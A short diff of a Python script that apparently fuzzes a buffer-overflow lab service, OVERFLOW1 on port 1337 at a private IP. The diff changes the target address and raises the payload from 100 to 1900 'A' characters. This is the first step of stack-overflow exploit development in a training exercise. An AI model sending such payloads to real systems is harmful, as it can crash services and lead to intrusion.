@@ -2,13 +2,13 @@
 
 import socket, time, sys
 
-ip = "10.10.23.54"
+ip = "10.10.157.76"
 
 port = 1337
 timeout = 5
 prefix = "OVERFLOW1 "
 
-string = prefix + "A" * 100
+string = prefix + "A" * 1900
 
 while True:
   try:
